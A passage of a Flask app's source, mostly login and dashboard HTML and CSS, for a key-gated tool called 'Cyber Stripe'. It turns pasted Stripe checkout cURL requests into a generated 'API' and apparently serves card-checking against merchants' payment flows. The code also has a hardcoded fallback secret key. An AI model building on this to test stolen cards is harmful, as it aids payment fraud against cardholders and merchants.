from flask import Flask, request, jsonify, Response, session, redirect, url_for
import re, os, shlex, uuid, threading, time, requests as req
from urllib.parse import unquote
from collections import OrderedDict
from datetime import datetime
from functools import wraps

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'cyber_stripe_secret_key_2024_ultra_secure')


SITE_URL = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')

def keep_alive():
    """Ping automático para evitar que o Render desligue o site"""
    while True:
        time.sleep(600)
        try:
            req.get(SITE_URL, timeout=10)
            print(f"[ANTI-SLEEP] Ping OK - {SITE_URL}")
        except:
            print("[ANTI-SLEEP] Ping falhou")

threading.Thread(target=keep_alive, daemon=True).start()

KEYS = {
    "cyber": {"user": "@cybersecofc", "expira": "14/07/2028"},
}


generated_apis = {}


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'authenticated' not in session or not session.get('authenticated'):
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function


LOGIN_PAGE = r'''
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cyber Stripe | Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --green: #00ff88;
            --green-dark: #00cc66;
            --red: #ff3355;
            --text: #e8e8f5;
            --text2: #8888bb;
            --text3: #555577;
            --glass: rgba(8,8,20,0.7);
            --glass-border: rgba(255,255,255,0.08);
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: #050510;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        /* Fundo com a imagem */
        .bg-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('foto1.png') center/cover no-repeat;
            z-index: 0;
        }
        
        .bg-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.65);
            backdrop-filter: blur(5px);
            z-index: 1;
        }
        
        /* Container do Login */
        .login-container {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 430px;
            animation: slideUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(50px) scale(0.93); }
            to { opacity: 1; transform: translateY(0) scale(1); }
        }
        
        .login-card {
            background: var(--glass);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid var(--glass-border);
            border-radius: 28px;
            padding: 45px 35px 40px;
            text-align: center;
            box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.03);
        }
        
        .login-logo {
            width: 70px;
            height: 70px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #00ff88, #00cc66);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2em;
            box-shadow: 0 15px 40px rgba(0,255,136,0.35);
            animation: logoPulse 2.5s infinite;
        }
        
        @keyframes logoPulse {
            0%, 100% { box-shadow: 0 15px 40px rgba(0,255,136,0.35); }
            50% { box-shadow: 0 15px 60px rgba(0,255,136,0.55); }
        }
        
        .login-card h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2em;
            font-weight: 900;
            letter-spacing: 3px;
            margin-bottom: 5px;
            background: linear-gradient(135deg, #fff 30%, #b0b0c0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .login-card .subtitle {
            font-size: 0.78em;
            color: var(--text3);
            margin-bottom: 28px;
            letter-spacing: 3px;
            text-transform: uppercase;
            font-weight: 500;
        }
        
        .input-group {
            position: relative;
            margin-bottom: 5px;
        }
        
        .input-group .icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.1em;
            color: var(--text3);
            z-index: 1;
            transition: color 0.3s;
        }
        
        .login-card input {
            width: 100%;
            padding: 15px 16px 15px 48px;
            border: 1.5px solid rgba(255,255,255,0.06);
            border-radius: 16px;
            background: rgba(255,255,255,0.03);
            color: #fff;
            font-size: 0.95em;
            font-family: 'Inter', sans-serif;
            text-align: center;
            letter-spacing: 1.5px;
            outline: none;
            transition: all 0.3s ease;
        }
        
        .login-card input:focus {
            border-color: var(--green);
            background: rgba(0,255,136,0.04);
            box-shadow: 0 0 35px rgba(0,255,136,0.1);
        }
        
        .login-card input:focus ~ .icon,
        .login-card input:focus + .icon {
            color: var(--green);
        }
        
        .login-card input::placeholder {
            color: rgba(255,255,255,0.18);
            letter-spacing: 1px;
            font-weight: 400;
        }
        
        .login-card button {
            width: 100%;
            padding: 15px;
            margin-top: 20px;
            border: none;
            border-radius: 16px;
            background: linear-gradient(135deg, #00ff88, #00cc66);
            color: #000;
            font-size: 1em;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            letter-spacing: 1px;
            font-family: 'Inter', sans-serif;
            position: relative;
            overflow: hidden;
        }
        
        .login-card button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }
        
        .login-card button:hover::before {
            left: 100%;
        }
        
        .login-card button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 45px rgba(0,255,136,0.45);
        }
        
        .login-card button:active {
            transform: scale(0.96);
        }
        
        .error-msg {
            color: #ff5252;
            margin-top: 14px;
            font-size: 0.8em;
            font-weight: 500;
            display: none;
            padding: 10px 14px;
            background: rgba(255,51,85,0.08);
            border-radius: 12px;
            border: 1px solid rgba(255,51,85,0.2);
            animation: shake 0.5s;
        }
        
        .error-msg.show {
            display: block;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            75% { transform: translateX(6px); }
        }
        
        .footer-text {
            margin-top: 20px;
            font-size: 0.7em;
            color: var(--text3);
            letter-spacing: 1px;
        }
        
        .footer-text a {
            color: var(--green);
            text-decoration: none;
            font-weight: 600;
        }
        
        .footer-text a:hover {
            text-decoration: underline;
        }
        
        /* Responsivo */
        @media (max-width: 500px) {
            .login-card {
                padding: 30px 22px 30px;
            }
            .login-card h1 {
                font-size: 1.5em;
                letter-spacing: 2px;
            }
            .login-logo {
                width: 55px;
                height: 55px;
                font-size: 1.5em;
            }
            .login-card input {
                font-size: 0.85em;
                padding: 13px 14px 13px 42px;
            }
            .login-card button {
                font-size: 0.9em;
                padding: 13px;
            }
        }
    </style>
</head>
<body>
    <!-- Fundo -->
    <div class="bg-image"></div>
    <div class="bg-overlay"></div>
    
    <!-- Card de Login -->
    <div class="login-container">
        <div class="login-card">
            <div class="login-logo">⚡</div>
            <h1>CYBER STRIPE</h1>
            <p class="subtitle">Alto Coder Professional v5.0</p>
            
            <form method="POST" action="/login" onsubmit="return validateForm()">
                <div class="input-group">
                    <span class="icon">🔑</span>
                    <input type="password" id="keyInput" name="key" placeholder="DIGITE SUA KEY DE ACESSO" autocomplete="off" required>
                </div>
                <button type="submit">🚀 ACESSAR SISTEMA</button>
            </form>
            
            <div class="error-msg" id="errorMsg"></div>
            
            <div class="footer-text">
                © 2024 <a href="https://t.me/cybersecofcadm" target="_blank">@cybersecofc</a> | Acesso Restrito
            </div>
        </div>
    </div>
    
    <!-- YouTube Player (música de fundo) -->
    <iframe id="ytPlayer" width="0" height="0" 
        src="https://www.youtube.com/embed/75bCm-EDnpk?autoplay=1&loop=1&playlist=75bCm-EDnpk&controls=0&showinfo=0&rel=0&iv_load_policy=3&mute=0" 
        frameborder="0" allow="autoplay; encrypted-media" allowfullscreen 
        style="position: fixed; bottom: 0; right: 0; z-index: -1; opacity: 0; pointer-events: none;">
    </iframe>
    
    <script>
        // Exibir erro se houver (passado pelo servidor)
        const urlParams = new URLSearchParams(window.location.search);
        const error = urlParams.get('error');
        
        if (error) {
            const errorMsg = document.getElementById('errorMsg');
            if (error === 'invalid_key') {
                errorMsg.textContent = '⚠️ Key inválida! Verifique e tente novamente.';
            } else if (error === 'desativado') {
                errorMsg.textContent = '⛔ Esta key foi DESATIVADA permanentemente!';
            } else if (error === 'empty') {
                errorMsg.textContent = '⚠️ Por favor, digite uma key de acesso!';
            } else {
                errorMsg.textContent = '⚠️ ' + decodeURIComponent(error);
            }
            errorMsg.classList.add('show');
            
            // Sacudir o input
            const input = document.getElementById('keyInput');
            input.style.borderColor = '#ff5252';
            input.style.boxShadow = '0 0 20px rgba(255,51,85,0.3)';
            setTimeout(() => {
                input.style.borderColor = 'rgba(255,255,255,0.06)';
                input.style.boxShadow = 'none';
            }, 2000);
        }
        
        function validateForm() {
            const key = document.getElementById('keyInput').value.trim();
            if (!key) {
                const errorMsg = document.getElementById('errorMsg');
                errorMsg.textContent = '⚠️ Por favor, digite uma key de acesso!';
                errorMsg.classList.add('show');
                return false;
            }
            return true;
        }
        
        // Focar no input automaticamente
        document.getElementById('keyInput').focus();
        
        // Permitir Enter para submit
        document.getElementById('keyInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.form.submit();
            }
        });
        
        // Iniciar YouTube com som
        document.addEventListener('click', function() {
            const iframe = document.getElementById('ytPlayer');
            if (iframe.src.indexOf('autoplay=1') === -1) {
                iframe.src = iframe.src.replace('autoplay=0', 'autoplay=1');
            }
        }, { once: true });
    </script>
</body>
</html>
'''


HTML_PAGE = r'''
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cyber Stripe | Alto Coder Pro v5.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #050510;
            --surface: #0a0a1a;
            --surface2: #0f0f25;
            --border: #1a1a3a;
            --border-hover: #2a2a5a;
            --green: #00ff88;
            --green-dark: #00cc66;
            --blue: #3399ff;
            --purple: #8844ff;
            --red: #ff3355;
            --yellow: #ffaa00;
            --cyan: #00ddff;
            --text: #e8e8f5;
            --text2: #8888bb;
            --text3: #555577;
            --glow-green: 0 0 30px rgba(0,255,136,0.4);
            --glow-blue: 0 0 30px rgba(51,153,255,0.4);
            --glow-purple: 0 0 30px rgba(136,68,255,0.4);
            --gradient-main: linear-gradient(135deg, #00ff88, #00ddff, #8844ff);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background-image:
                radial-gradient(ellipse at 15% 40%, rgba(0,255,136,0.05) 0%, transparent 55%),
                radial-gradient(ellipse at 85% 25%, rgba(51,153,255,0.05) 0%, transparent 55%),
                radial-gradient(ellipse at 50% 85%, rgba(136,68,255,0.05) 0%, transparent 55%);
            background-attachment: fixed;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image:
                linear-gradient(rgba(0,255,136,0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0,255,136,0.02) 1px, transparent 1px);
            background-size: 60px 60px;
            pointer-events: none;
            z-index: 0;
            animation: gridMove 20s linear infinite;
        }
        
        @keyframes gridMove {
            0% { background-position: 0 0, 0 0; }
            100% { background-position: 60px 60px, 60px 60px; }
        }
        
        .app {
            position: relative;
            z-index: 1;
            max-width: 1100px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header */
        .header {
            text-align: center;
            padding: 30px 20px 25px;
            position: relative;
        }
        
        .logo-container {
            display: inline-block;
            position: relative;
            margin-bottom: 10px;
        }
        
        .logo-icon {
            font-size: 50px;
            display: block;
            animation: floatIcon 3s ease-in-out infinite;
            filter: drop-shadow(0 0 20px rgba(0,255,136,0.5));
        }
        
        @keyframes floatIcon {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        .logo-text {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.8em;
            font-weight: 900;
            letter-spacing: 4px;
            background: var(--gradient-main);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            line-height: 1.2;
        }
        
        .version-badge {
            display: inline-block;
            background: rgba(0,255,136,0.1);
            border: 1px solid rgba(0,255,136,0.3);
            color: var(--green);
            padding: 4px 12px;
            border-radius: 15px;
            font-size: 0.65em;
            font-weight: 700;
            letter-spacing: 2px;
            vertical-align: super;
            margin-left: 5px;
        }
        
        .subtitle {
            font-family: 'Share Tech Mono', monospace;
            color: var(--text3);
            letter-spacing: 3px;
            font-size: 0.8em;
            margin-top: 5px;
        }
        
        .user-info-bar {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 50px;
            padding: 8px 20px;
            margin-top: 12px;
            font-size: 0.8em;
            color: var(--text2);
        }
        
        .user-info-bar .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--green);
            box-shadow: 0 0 10px rgba(0,255,136,0.5);
        }
        
        .logout-link {
            color: var(--red);
            text-decoration: none;
            font-weight: 600;
            margin-left: 10px;
            cursor: pointer;
            transition: color 0.3s;
        }
        
        .logout-link:hover {
            color: #ff5555;
        }
        
        .badge-row {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }
        
        .badge {
            padding: 6px 16px;
            border-radius: 25px;
            font-size: 0.7em;
            font-weight: 600;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            transition: all 0.3s;
            cursor: default;
        }
        
        .badge:hover { transform: translateY(-2px); }
        .badge-green { background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.25); color: var(--green); box-shadow: 0 0 15px rgba(0,255,136,0.1); }
        .badge-blue { background: rgba(51,153,255,0.08); border: 1px solid rgba(51,153,255,0.25); color: var(--blue); box-shadow: 0 0 15px rgba(51,153,255,0.1); }
        .badge-purple { background: rgba(136,68,255,0.08); border: 1px solid rgba(136,68,255,0.25); color: var(--purple); box-shadow: 0 0 15px rgba(136,68,255,0.1); }
        
        /* Telegram Button */
        .telegram-btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: linear-gradient(135deg, #0088cc, #006699);
            color: #fff;
            padding: 8px 18px;
            border-radius: 25px;
            text-decoration: none;
            font-weight: 600;
            font-size: 0.8em;
            letter-spacing: 1px;
            transition: all 0.3s;
            margin-top: 12px;
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .telegram-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0,136,204,0.4);
        }
        
        .telegram-icon {
            font-size: 1.2em;
        }
        
        /* Card Principal */
        .main-card {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 30px;
            box-shadow: 0 25px 80px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.02);
            backdrop-filter: blur(10px);
            transition: border-color 0.3s;
        }
        
        .main-card:hover { border-color: var(--border-hover); }
        
        .card-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }
        
        .card-icon {
            width: 42px;
            height: 42px;
            background: linear-gradient(135deg, rgba(0,255,136,0.2), rgba(0,221,255,0.2));
            border: 1px solid rgba(0,255,136,0.3);
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2em;
            flex-shrink: 0;
        }
        
        .card-title {
            font-size: 1.2em;
            font-weight: 700;
            letter-spacing: 0.5px;
        }
        
        .card-desc {
            color: var(--text2);
            font-size: 0.85em;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        
        /* Textarea */
        .textarea-wrapper { position: relative; }
        
        textarea {
            width: 100%;
            min-height: 280px;
            background: var(--bg);
            border: 2px solid var(--border);
            border-radius: 16px;
            padding: 18px;
            color: var(--green);
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.8em;
            line-height: 1.7;
            resize: vertical;
            outline: none;
            transition: all 0.4s ease;
        }
        
        textarea:focus {
            border-color: var(--green);
            box-shadow: 0 0 0 5px rgba(0,255,136,0.06), var(--glow-green);
        }
        
        textarea::placeholder { color: #1f1f40; font-style: italic; }
        
        .textarea-counter {
            position: absolute;
            bottom: 12px;
            right: 18px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.65em;
            color: var(--text3);
            background: rgba(0,0,0,0.6);
            padding: 4px 10px;
            border-radius: 10px;
        }
        
        /* Botões */
        .btn-row {
            display: flex;
            gap: 12px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 14px 28px;
            border: none;
            border-radius: 14px;
            font-family: 'Inter', sans-serif;
            font-size: 0.9em;
            font-weight: 700;
            letter-spacing: 1.5px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
            text-transform: uppercase;
            position: relative;
            overflow: hidden;
        }
        
        .btn::after {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::after { left: 100%; }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--green), var(--green-dark));
            color: #000;
            box-shadow: var(--glow-green);
            flex: 1;
            justify-content: center;
            font-size: 0.95em;
            animation: pulse 2s infinite;
        }
        
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 45px rgba(0,255,136,0.5);
        }
        
        .btn-copy {
            background: linear-gradient(135deg, var(--blue), #0066cc);
            color: #fff;
            box-shadow: var(--glow-blue);
        }
        
        .btn-copy:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 40px rgba(51,153,255,0.5);
        }
        
        .btn-download {
            background: linear-gradient(135deg, var(--purple), #6622cc);
            color: #fff;
            box-shadow: var(--glow-purple);
        }
        
        .btn-download:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 40px rgba(136,68,255,0.5);
        }
        
        .btn-secondary {
            background: transparent;
            border: 2px solid var(--border);
            color: var(--text2);
        }
        
        .btn-secondary:hover {
            border-color: var(--red);
            color: var(--red);
            transform: translateY(-2px);
        }
        
        .btn:active { transform: scale(0.96) !important; }
        
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(0,255,136,0.4); }
            50% { box-shadow: 0 0 0 15px rgba(0,255,136,0); }
        }
        
        /* Results */
        .results {
            margin-top: 25px;
            display: none;
        }
        
        .results.show {
            display: block;
            animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1);
        }
        
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .result-card {
            background: var(--surface2);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 12px;
            transition: all 0.3s;
        }
        
        .result-card:hover { border-color: var(--border-hover); }
        .result-card.success { border-left: 4px solid var(--green); }
        .result-card.error { border-left: 4px solid var(--red); }
        .result-card.info { border-left: 4px solid var(--blue); }
        .result-card.code-card { border-left: 4px solid var(--purple); }
        
        .status-tag {
            display: inline-block;
            padding: 5px 14px;
            border-radius: 20px;
            font-size: 0.75em;
            font-weight: 700;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }
        
        .tag-success { background: rgba(0,255,136,0.12); color: var(--green); }
        .tag-error { background: rgba(255,51,85,0.12); color: var(--red); }
        .tag-info { background: rgba(51,153,255,0.12); color: var(--blue); }
        .tag-code { background: rgba(136,68,255,0.12); color: var(--purple); }
        
        .result-title {
            font-weight: 700;
            font-size: 1em;
            margin-bottom: 5px;
        }
        
        .result-meta {
            color: var(--text2);
            font-size: 0.8em;
            word-break: break-all;
        }
        
        .step-list { list-style: none; margin-top: 10px; }
        
        .step-item {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 12px;
            background: var(--bg);
            border-radius: 10px;
            margin-bottom: 5px;
            font-size: 0.8em;
            flex-wrap: wrap;
            transition: all 0.2s;
            border: 1px solid transparent;
        }
        
        .step-item:hover { border-color: var(--border); background: #08081a; }
        
        .step-num {
            width: 28px;
            height: 28px;
            background: var(--surface2);
            border: 2px solid var(--border);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 800;
            font-size: 0.75em;
            color: var(--green);
            flex-shrink: 0;
        }
        
        .method-tag {
            padding: 2px 8px;
            border-radius: 5px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.65em;
            font-weight: 700;
            letter-spacing: 1px;
            flex-shrink: 0;
        }
        
        .method-POST { background: rgba(0,255,136,0.12); color: var(--green); }
        .method-GET { background: rgba(51,153,255,0.12); color: var(--blue); }
        
        .step-info { flex: 1; min-width: 150px; }
        .step-url { color: var(--text3); word-break: break-all; font-size: 0.82em; font-family: 'Share Tech Mono', monospace; }
        .step-purpose { 
            color: var(--yellow); 
            font-size: 0.68em; 
            text-transform: uppercase; 
            letter-spacing: 1.5px;
            font-weight: 700;
            flex-shrink: 0;
            background: rgba(255,170,0,0.08);
            padding: 3px 8px;
            border-radius: 15px;
        }
        
        /* Code Block */
        .code-block {
            background: #000000;
            padding: 16px;
            border-radius: 12px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.75em;
            color: var(--green);
            margin-top: 10px;
            word-break: break-all;
            overflow-x: auto;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid var(--border);
            line-height: 1.6;
            white-space: pre-wrap;
            position: relative;
        }
        
        .code-block::-webkit-scrollbar { width: 5px; height: 5px; }
        .code-block::-webkit-scrollbar-track { background: #000; border-radius: 10px; }
        .code-block::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
        
        .code-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 8px;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .code-actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        .btn-sm {
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            font-family: 'Inter', sans-serif;
            font-size: 0.75em;
            font-weight: 600;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
        }
        
        .btn-sm-copy { background: var(--blue); color: #fff; }
        .btn-sm-copy:hover { background: #0066cc; }
        .btn-sm-download { background: var(--purple); color: #fff; }
        .btn-sm-download:hover { background: #6622cc; }
        
        /* Loader */
        .loader {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 40px;
        }
        
        .spinner {
            width: 28px;
            height: 28px;
            border: 3px solid var(--border);
            border-top-color: var(--green);
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }
        
        @keyframes spin { to { transform: rotate(360deg); } }
        .loader-text { color: var(--text2); font-weight: 500; }
        
        /* Toast */
        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 14px 24px;
            border-radius: 14px;
            color: #fff;
            font-weight: 700;
            z-index: 9999;
            animation: toastIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
            max-width: 90vw;
            font-size: 0.85em;
            box-shadow: 0 15px 40px rgba(0,0,0,0.5);
            backdrop-filter: blur(10px);
        }
        
        .toast-success { background: #00cc66; }
        .toast-error { background: #ff3355; }
        
        @keyframes toastIn {
            from { opacity: 0; transform: translateX(120px) scale(0.9); }
            to { opacity: 1; transform: translateX(0) scale(1); }
        }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 25px;
            color: var(--text3);
            font-size: 0.75em;
            letter-spacing: 1px;
        }
        
        .footer a { color: var(--green); text-decoration: none; font-weight: 600; }
        .footer a:hover { text-decoration: underline; }
        .footer-divider {
            width: 50px;
            height: 2px;
            background: var(--gradient-main);
            margin: 12px auto;
            border-radius: 10px;
        }
        
        /* Responsivo - Mobile */
        @media (max-width: 768px) {
            .app { padding: 10px; }
            .header { padding: 20px 10px 20px; }
            .logo-text { font-size: 1.8em; letter-spacing: 3px; }
            .logo-icon { font-size: 35px; }
            .subtitle { font-size: 0.7em; letter-spacing: 2px; }
            .badge { font-size: 0.65em; padding: 5px 12px; }
            .main-card { padding: 18px; border-radius: 18px; }
            .card-title { font-size: 1em; }
            .card-desc { font-size: 0.78em; }
            textarea { min-height: 220px; font-size: 0.7em; padding: 14px; }
            .btn { padding: 12px 20px; font-size: 0.8em; letter-spacing: 1px; }
            .btn-row { flex-direction: column; gap: 8px; }
            .btn { width: 100%; justify-content: center; }
            .step-item { font-size: 0.72em; gap: 6px; }
            .step-num { width: 24px; height: 24px; font-size: 0.7em; }
            .step-url { font-size: 0.7em; }
            .code-block { font-size: 0.65em; max-height: 300px; }
            .btn-sm { font-size: 0.7em; padding: 6px 12px; }
            .code-actions { width: 100%; }
            .code-actions .btn-sm { flex: 1; text-align: center; justify-content: center; }
            .telegram-btn { font-size: 0.7em; padding: 6px 14px; }
            .toast { top: 10px; right: 10px; left: 10px; max-width: none; font-size: 0.78em; }
            .result-card { padding: 14px; }
            .status-tag { font-size: 0.7em; }
        }
        
        @media (max-width: 400px) {
            .logo-text { font-size: 1.5em; }
            .main-card { padding: 12px; }
            textarea { min-height: 180px; font-size: 0.65em; }
            .btn { padding: 10px 16px; font-size: 0.75em; }
        }
    </style>
</head>
<body>
    <div class="app">
        <!-- Header -->
        <div class="header">
            <div class="logo-container">
                <span class="logo-icon">⚡</span>
            </div>
            <div class="logo-text">
                CYBER STRIPE
                <span class="version-badge">v5.0</span>
            </div>
            <div class="subtitle">ALTO CODER PROFESSIONAL</div>
            <div class="user-info-bar">
                <span class="dot"></span>
                <span id="userDisplay">USER_LOADING</span>
                <a href="/logout" class="logout-link" title="Sair do sistema">🚪 SAIR</a>
            </div>
            <div class="badge-row">
                <span class="badge badge-green">🔒 Stripe API</span>
                <span class="badge badge-blue">🔄 Multi cURLs</span>
                <span class="badge badge-purple">🤖 Auto Detect</span>
            </div>
            <a href="https://t.me/cybersecofcadm" target="_blank" class="telegram-btn">
                <span class="telegram-icon">📢</span> Canal Telegram
            </a>
        </div>
        
        <!-- Card Principal -->
        <div class="main-card">
            <div class="card-header">
                <div class="card-icon">📋</div>
                <div>
                    <div class="card-title">Cole seus cURLs do Stripe</div>
                    <div class="card-desc">Suporte ilimitado a cURLs. O sistema identifica automaticamente tokens, payment methods e monta a sequência correta.</div>
                </div>
            </div>
            
            <div class="textarea-wrapper">
                <textarea id="curlInput" placeholder="Cole aqui seus cURLs...&#10;&#10;curl 'https://api.stripe.com/v1/payment_methods' \&#10;  -H 'content-type: application/x-www-form-urlencoded' \&#10;  --data-raw 'type=card&amp;card[number]=4242424242424242'&#10;&#10;curl 'https://site.com/pay' \&#10;  -H 'content-type: application/x-www-form-urlencoded' \&#10;  --data-raw 'payment_method=pm_xxx'"></textarea>
                <span class="textarea-counter" id="charCount">0 caracteres</span>
            </div>
            
            <div class="btn-row">
                <button class="btn btn-primary" onclick="generateAPI()">
                    ⚡ GERAR API AGORA
                </button>
                <button class="btn btn-secondary" onclick="clearAll()">
                    🗑️ LIMPAR TUDO
                </button>
            </div>
            
            <!-- Results -->
            <div class="results" id="results">
                <div id="resultsContent"></div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div class="footer-divider"></div>
            © 2024 <a href="https://t.me/cybersecofcadm" target="_blank">Cyber Stripe</a> | Alto Coder Professional | @cybersecofc
            <br>
            <span style="font-size: 0.85em; color: var(--text3);">Ctrl + Enter para gerar rapidamente</span>
        </div>
    </div>
    
    <!-- YouTube Player (música de fundo) -->
    <iframe id="ytPlayer" width="0" height="0" 
        src="https://www.youtube.com/embed/75bCm-EDnpk?autoplay=1&loop=1&playlist=75bCm-EDnpk&controls=0&showinfo=0&rel=0&iv_load_policy=3&mute=0" 
        frameborder="0" allow="autoplay; encrypted-media" allowfullscreen 
        style="position: fixed; bottom: 0; right: 0; z-index: -1; opacity: 0; pointer-events: none;">
    </iframe>
    
    <script>
        // Dados do usuário (passados pelo servidor)
        const USER_DATA = {
            user: 'USER_PLACEHOLDER',
            plano: 'PLANO_PLACEHOLDER',
            expiracao: 'EXP_PLACEHOLDER'
        };
        
        // Exibir informações do usuário
        document.getElementById('userDisplay').textContent = 
            USER_DATA.user + ' | 💎 ' + USER_DATA.plano + ' | 📅 ' + USER_DATA.expiracao;
        
        // Detectar dispositivo
        const isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
        if (isMobile) {
            document.body.classList.add('mobile-device');
        }
        
        // Contador de caracteres
        const textarea = document.getElementById('curlInput');
        const charCount = document.getElementById('charCount');
        
        textarea.addEventListener('input', () => {
            const len = textarea.value.length;
            charCount.textContent = len + ' caracteres';
            charCount.style.color = len > 10000 ? '#ff3355' : '#555577';
        });
        
        // Toast
        function toast(msg, type) {
            const t = document.createElement('div');
            t.className = 'toast toast-' + type;
            t.textContent = msg;
            document.body.appendChild(t);
            setTimeout(() => {
                t.style.opacity = '0';
                t.style.transform = 'translateX(120px)';
                t.style.transition = 'all 0.3s ease';
                setTimeout(() => t.remove(), 300);
            }, 3500);
        }
        
        // Variável global para armazenar o código gerado
        let currentGeneratedCode = '';
        let currentFilename = '';
        
        // Gerar API
        async function generateAPI() {
            const curls = document.getElementById('curlInput').value;
            
            if (!curls.trim()) {
                toast('⚠️ Por favor, cole seus cURLs primeiro!', 'error');
                return;
            }
            
            const results = document.getElementById('results');
